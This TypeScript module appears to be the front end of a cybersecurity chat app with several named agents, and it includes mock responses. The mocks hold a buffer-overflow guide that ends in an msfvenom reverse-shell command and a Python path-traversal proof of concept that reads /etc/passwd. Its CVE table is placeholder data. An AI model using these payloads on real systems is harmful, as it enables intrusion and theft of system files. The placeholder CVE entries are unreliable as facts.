import { systemPrompts } from './systemPrompts';

export interface Model {
  id: string;
  name: string;
  description: string;
  specializations: string[];
  isSelected: boolean;
  icon: string; // URL to the model's icon image
}

export interface Message {
  id: string;
  role: 'user' | 'assistant';
  content: string;
  timestamp: Date;
  model?: string;
}

export const models: Model[] = [
  {
    id: 'theta',
    name: 'Agent Theta',
    description: 'Advanced cybersecurity model specialized in threat analysis and vulnerability assessment',
    specializations: [
      'Advanced Persistent Threats (APT)', 
      'Cloud Security',
      'Governance, Risk and Compliance',
      'Network Security',
      'And 25+ other areas'
    ],
    isSelected: true,
    icon: '/models/theta-icon.svg'
  },
  {
    id: 'epsilon',
    name: 'Agent Epsilon',
    description: 'Expert in malware analysis and reverse engineering',
    specializations: [
      'Malware Analysis',
      'Reverse Engineering',
      'Threat Intelligence',
      'Incident Response',
      'Exploit Analysis',
      'Code Analysis'
    ],
    isSelected: false,
    icon: '/models/epsilon-icon.svg'
  },
  {
    id: 'darkbert',
    name: 'Agent PI',
    description: 'Capable of internet searching',
    specializations: [
      'Dark web intelligence',
      'Credential leaks',
      'Underground markets',
      'Threat actor tracking'
    ],
    isSelected: false,
    icon: '/models/darkbert-icon.svg'
  },
  {
    id: 'deepseek',
    name: 'Agent Cosine',
    description: 'General AI for your daily go to go',
    specializations: [
      'Web scraping',
      'Real-time intelligence',
      'News aggregation',
      'Technical documentation search'
    ],
    isSelected: false,
    icon: '/models/deepseek-icon.svg'
  }
];

const baseUrl = 'http://localhost:5000';

export type ModelType = 'theta' | 'epsilon' | 'search';

export const endpoints: Record<ModelType, string> = {
  theta: '/theta',
  epsilon: '/epsilon',
  search: '/search'
};

const determineEndpoint = (message: string, model: ModelType): string => {
  if (message.startsWith('/search')) {
    return endpoints.search;
  }
  return endpoints[model];
};

export const processMessage = async (message: string, model: ModelType): Promise<string> => {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 300000); // 5-minute timeout

  try {
    const endpoint = determineEndpoint(message, model);
    
    // Check if the message starts with a security command
    const command = Object.keys(systemPrompts).find(cmd => message.startsWith(cmd));
    const systemPrompt = command ? systemPrompts[command] : undefined;

    const response = await fetch(`${baseUrl}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ 
        message, 
        model,
        systemPrompt // Include the system prompt if a security command is detected
      }),
      signal: controller.signal
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const reader = response.body?.getReader();
    let result = '';
    let hasContent = false;

    if (!reader) {
      throw new Error('Response body is not readable');
    }

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      
      const chunk = new TextDecoder().decode(value);
      const lines = chunk.split('\n');
      
      for (const line of lines) {
        if (line.startsWith('data: ')) {
          const content = line.slice(6);
          if (content.trim()) {
            hasContent = true;
            result += content;
            // Emit progress event
            window.dispatchEvent(new CustomEvent('responseProgress', {
              detail: { 
                progress: result,
                isComplete: false
              }
            }));
          }
        }
      }
    }

    if (!hasContent) {
      throw new Error('No response received from the model');
    }

    // Emit completion event
    window.dispatchEvent(new CustomEvent('responseProgress', {
      detail: { 
        progress: result,
        isComplete: true
      }
    }));

    return result;
  } catch (error) {
    if (error.name === 'AbortError') {
      throw new Error('Request timed out after 5 minutes');
    }
    throw error;
  } finally {
    clearTimeout(timeout);
  }
};

function formatChatHistoryForAPI(chatHistory: Message[]): Array<{role: string, content: string}> {
  return chatHistory.map(msg => ({
    role: msg.role,
    content: msg.content
  }));
}

function getModelNameFromEndpoint(endpoint: string): string {
  switch(endpoint) {
    case endpoints.theta:
      return 'Agent Theta';
    case endpoints.epsilon:
      return 'Agent Epsilon';
    case endpoints.search:
      return 'Agent PI';
    default:
      return 'System';
  }
}

function processMockMessage(
  message: string, 
  selectedModels: string[], 
  chatHistory: Message[]
): Promise<{ text: string, model: string }> {
  return new Promise(resolve => {
    setTimeout(() => {
      const isCommand = message.startsWith('/');
      
      if (isCommand) {
        const command = message.split(' ')[0].toLowerCase();
        
        switch(command) {
          case '/cve':
          case '/apt':
          case '/ioc':
          case '/attackpath':
            resolve({ text: simulateLilyResponse(message, command, chatHistory), model: 'Agent Theta' });
            break;
            
          case '/pentest':
          case '/privesc':
          case '/lateral':
          case '/reveng':
          case '/malware':
          case '/exploit':
            resolve({ text: simulateSenecaResponse(message, command, chatHistory), model: 'Agent Epsilon' });
            break;
            
          case '/exploitdb':
            resolve({ text: simulateDarkbertResponse(message, command, chatHistory), model: 'Agent PI' });
            break;
            
          default:
            const modelId = selectedModels[0] || 'theta';
            const modelName = modelId === 'theta' ? 'Agent Theta' : 
                            modelId === 'epsilon' ? 'Agent Epsilon' :
                            modelId === 'darkbert' ? 'Agent PI' :
                            'Agent Cosine';
            resolve({ 
              text: `${modelName} processing command: ${message}. This is a simulated response since the actual Python backend integration is not implemented.`, 
              model: modelName 
            });
            break;
        }
      } else {
        if (selectedModels.includes('deepseek')) {
          resolve({ 
            text: "Agent Cosine web search results: I've found relevant cybersecurity information based on your query. This is a simulated response as the actual Python backend integration is not implemented.", 
            model: 'Agent Cosine' 
          });
        } else {
          const modelId = selectedModels[0] || 'theta';
          const modelName = modelId === 'theta' ? 'Agent Theta' : 
                          modelId === 'epsilon' ? 'Agent Epsilon' :
                          modelId === 'seneca' ? 'Agent Seneca' :
                          modelId === 'darkbert' ? 'Agent PI' :
                          'Agent Cosine';
          
          resolve({ 
            text: `${modelName} response: This is a simulated response from the ${modelName} model. In a real implementation, this would be processed by the ${modelId}.py backend file.`, 
            model: modelName 
          });
        }
      }
    }, 800);
  });
}

function simulateLilyResponse(message: string, command: string, chatHistory: Message[]): string {
  switch(command) {
    case '/cve':
      return `
## Recent Critical CVEs

| CVE ID | Severity | Description | Patch Available |
|--------|----------|-------------|----------------|
| CVE-2023-4872 | CRITICAL | Remote code execution in OpenSSL | Yes |
| CVE-2023-5192 | HIGH | Kernel privilege escalation | Yes |
| CVE-2023-6201 | CRITICAL | Zero-day in popular web framework | No |

*Recommendation: Prioritize patching CVE-2023-4872 and CVE-2023-5192 immediately.*
`;
    case '/apt':
      return `
## APT29 (Cozy Bear)

**Origin**: Russia (State-Sponsored)
**Target Industries**: Government, Defense, Healthcare, Energy

### MITRE ATT&CK Techniques:
- Initial Access: T1566 (Phishing)
- Execution: T1059 (Command and Script Interpreter)
- Persistence: T1098 (Account Manipulation)
- Privilege Escalation: T1068 (Exploitation for Privilege Escalation)
- Defense Evasion: T1027 (Obfuscated Files or Information)

### Recent Campaigns:
- SolarWinds supply chain attack
- COVID-19 research targeting
- Democratic institutions targeting
`;
    default:
      return `Agent Theta processing command: ${message}. This is a simulated response for the ${command} command.`;
  }
}

function simulateSenecaResponse(message: string, command: string, chatHistory: Message[]): string {
  switch(command) {
    case '/malware':
      return `
## Malware Analysis Playbook

### Static Analysis
\`\`\`bash
# Calculate file hashes
sha256sum suspicious_file.exe

# Check strings
strings -n 8 suspicious_file.exe | grep -i "http\\|cmd\\|powershell\\|registry"

# PE header analysis
pescan suspicious_file.exe
\`\`\`

### Dynamic Analysis
1. Set up isolated environment (Sandbox)
2. Capture baseline system snapshot
3. Execute sample
4. Monitor:
   - Process activity
   - File system changes
   - Registry modifications
   - Network connections

### Memory Forensics
\`\`\`bash
# Dump process memory
volatility -f memory.dmp pslist
volatility -f memory.dmp malfind
\`\`\`

*Always practice safe handling procedures when analyzing malicious software.*
`;
    case '/exploit':
      return `
## Buffer Overflow Exploitation Guide

### Vulnerability Identification
\`\`\`c
// Vulnerable function
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}
\`\`\`

### Exploitation Steps
1. **Fuzzing**: Determine crash point
   \`\`\`python
   payload = b"A" * 100
   \`\`\`

2. **Control EIP/RIP**
   - Find offset with pattern
   - Verify exact control

3. **Find Bad Characters**
   \`\`\`python
   badchars = (
     b"\\x01\\x02\\x03\\x04\\x05...\\xFF"
   )
   \`\`\`

4. **Find JMP ESP gadget**
   \`\`\`
   !mona jmp -r esp
   \`\`\`

5. **Shellcode Generation**
   \`\`\`bash
   msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f python -b "\\x00"
   \`\`\`

*Remember: Only test on systems you're authorized to exploit!*
`;
    default:
      return `Agent Epsilon processing command: ${message}. This is a simulated response for the ${command} command.`;
  }
}

function simulateDarkbertResponse(message: string, command: string, chatHistory: Message[]): string {
  return `
## Exploit-DB Results

| Date | Title | Platform | Type | Verified |
|------|-------|----------|------|----------|
| 2023-03-15 | WordPress Plugin XSS Vulnerability | Web | Remote | Yes |
| 2023-02-22 | OpenSSH 8.5 Authentication Bypass | Linux | Remote | Yes |
| 2023-01-30 | Windows Print Spooler LPE | Windows | Local | Yes |

### Featured Exploit
\`\`\`python
# CVE-2023-XXXX Exploit PoC
import requests
import sys

def exploit(target, port):
    payload = {"param": "../../../../etc/passwd%00"}
    try:
        r = requests.get(f"http://{target}:{port}/vulnerable.php", 
                         params=payload, 
                         timeout=5)
        if "root:x:0:0" in r.text:
            print("[+] Exploit successful!")
            print(r.text)
        else:
            print("[-] Exploit failed.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target> <port>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
\`\`\`

*Note: This is a simulated response from Agent PI. In a real implementation, this data would come from internet search results.*
`;
}

export const chat = async (message: string) => {
  try {
    const result = await processMessage(message, 'theta');
    return { response: result };
  } catch (error) {
    console.error('Chat error:', error);
    return { error: 'Failed to get response. Please try again.' };
  }
};

export const search = async (query: string) => {
  try {
    const result = await processMessage(`/search ${query}`, 'search');
    return { response: result };
  } catch (error) {
    console.error('Search error:', error);
    throw error;
  }
};

export const seneca = async (command: string) => {
  try {
    const result = await processMessage(`/seneca ${command}`, 'seneca');
    return { response: result };
  } catch (error) {
    console.error('Seneca error:', error);
    return { error: 'Command failed. Please try again.' };
  }
};
